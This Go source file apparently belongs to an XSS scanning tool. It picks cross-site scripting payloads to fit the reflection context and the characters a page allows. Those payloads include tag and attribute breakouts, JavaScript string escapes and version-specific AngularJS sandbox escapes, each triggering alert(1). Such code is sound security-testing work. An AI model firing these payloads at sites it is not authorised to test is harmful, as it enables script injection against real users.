package payloads

import (
	"strings"

	"github.com/lcalzada-xor/xxss/v2/pkg/models"
	"github.com/lcalzada-xor/xxss/v2/pkg/scanner/technologies"
)

// GeneratePayload constructs a context-specific payload based on allowed characters.
// It attempts to build the most effective payload given the constraints.
func GeneratePayload(context models.ReflectionContext, allowed []string, techs []*technologies.Technology) string {
	// Helper to check for char presence
	has := func(char string) bool {
		for _, c := range allowed {
			if c == char {
				return true
			}
		}
		return false
	}

	hasLt := has("<")
	hasGt := has(">")
	hasDquote := has("\"")
	hasSquote := has("'")
	hasSlash := has("/")
	hasEquals := has("=")
	hasSpace := has(" ")
	hasParen := has("(") && has(")")
	hasBacktick := has("`")

	switch context {
	case models.ContextHTML:
		// Check for Vue.js
		for _, tech := range techs {
			if tech.Name == "Vue.js" {
				// Vue.js Template Injection
				return "{{7*7}}"
			}
		}
		// Fallthrough to standard HTML payloads
		if hasLt && hasGt && hasSlash {
			return "<script>alert(1)</script>"
		}
		if hasLt && hasGt && hasEquals {
			return "<img src=x onerror=alert(1)>"
		}
		if hasLt && hasGt {
			return "<svg onload=alert(1)>"
		}

	case models.ContextAttribute:
		// Try to break out of tag
		if hasGt && hasLt {
			if hasDquote {
				return "\"><script>alert(1)</script>"
			}
			if hasSquote {
				return "'><script>alert(1)</script>"
			}
			return "><script>alert(1)</script>"
		}
		// Try event handler injection
		if hasEquals {
			// Determine separator
			sep := " "
			if !hasSpace && hasSlash {
				sep = "/"
			}

			payload := "onmouseover=alert(1)"
			if hasSpace {
				payload = " " + payload
			} else if hasSlash {
				payload = "/" + payload
			}

			// Try to close attribute if needed
			if hasDquote {
				return "\"" + payload + sep + "x=\""
			}
			if hasSquote {
				return "'" + payload + sep + "x='"
			}
			return payload
		}

	case models.ContextJSSingleQuote:
		if hasSquote {
			base := "';alert(1)//"
			if !hasSlash {
				base = "';alert(1);'"
			}
			return base
		}

	case models.ContextJSDoubleQuote:
		if hasDquote {
			base := "\";alert(1)//"
			if !hasSlash {
				base = "\";alert(1);\""
			}
			return base
		}

	case models.ContextTemplateLiteral:
		if hasBacktick {
			return "`+alert(1)+`"
		}
		if has("${") && has("}") {
			return "${alert(1)}"
		}

	case models.ContextJSRaw:
		if hasParen {
			return ";alert(1);//"
		}
		return "alert(1)"

	case models.ContextAngular:
		// AngularJS sandbox escape payloads
		version := ""
		for _, tech := range techs {
			if tech.Name == "AngularJS" {
				version = tech.Version
				break
			}
		}

		// Version-specific payloads
		if version != "" {
			// 1.6+ (including 1.7.x, 1.8.x)
			if strings.HasPrefix(version, "1.6") || strings.HasPrefix(version, "1.7") || strings.HasPrefix(version, "1.8") {
				return "{{$on.constructor('alert(1)')()}}"
			}
			// 1.5.x
			if strings.HasPrefix(version, "1.5") {
				return "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}"
			}
			// 1.4.x
			if strings.HasPrefix(version, "1.4") {
				return "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}"
			}
			// 1.3.x
			if strings.HasPrefix(version, "1.3") {
				return "{{!ready && (ready = true) && (on = {}.constructor.prototype) && (on.constructor.prototype = null) && (on.constructor = [].pop.constructor) && on.constructor('alert(1)')()}}"
			}
			// 1.2.x
			if strings.HasPrefix(version, "1.2") {
				return "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}"
			}
			// 1.0.x - 1.1.x
			if strings.HasPrefix(version, "1.0") || strings.HasPrefix(version, "1.1") {
				return "{{constructor.constructor('alert(1)')()}}"
			}
		}

		// Fallback logic based on allowed chars if version is unknown or payload fails
		hasDot := has(".")
		hasBracket := has("[") && has("]")

		if hasDot {
			// $on-based escape (Works for Angular 1.6+ including 1.7.7)
			return "{{$on.constructor('alert(1)')()}}"
		}
		if hasParen && hasDot {
			// Constructor-based escape
			return "{{constructor.constructor('alert(1)')()}}"
		}
		if hasBracket && hasParen && hasDot {
			// Array-based escape
			return "{{[].pop.constructor('alert(1)')()}}"
		}
		// Fallback - simple expression
		return "{{alert(1)}}"
	}

	// Fallback to static polyglot if dynamic generation fails
	return GetDefaultPolyglot()
}

// has checks if a string contains a substring (helper for internal logic if needed,
// but the closure above is better for the slice check)
func hasStr(s, substr string) bool {
	return strings.Contains(s, substr)
}
